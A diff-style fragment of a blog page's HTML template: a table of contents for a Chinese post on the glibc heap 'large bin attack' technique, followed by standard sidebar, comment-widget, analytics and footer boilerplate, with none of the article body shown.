+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">large bin attack</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">large bin特点</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">large bin 相关源码</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">源码解析</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">how2heap large bin attck</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">参考文章：</span></a></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#PWN" title="PWN">PWN</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://beantech.org" target="_blank">Bean Tech</a></li>
+                    
+                        <li><a href="http://blog.kaijun.rocks" target="_blank">Kaijun&#39;s Blog</a></li>
+                    
+                        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">It Helps SEO</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "your-disqus-ID";
+    var disqus_identifier = "http://yoursite-url/2019/06/24/large-bin-attack/";
+    var disqus_url = "http://yoursite-url/2019/06/24/large-bin-attack/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/zettt8214">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 骑猪满天飞 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    re-Ported by <a href="http://beantech.org">BeanTech</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=YenYuHsuan&repo=hexo-theme-beantech&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite-url/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<img src="http://yoursite-url/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
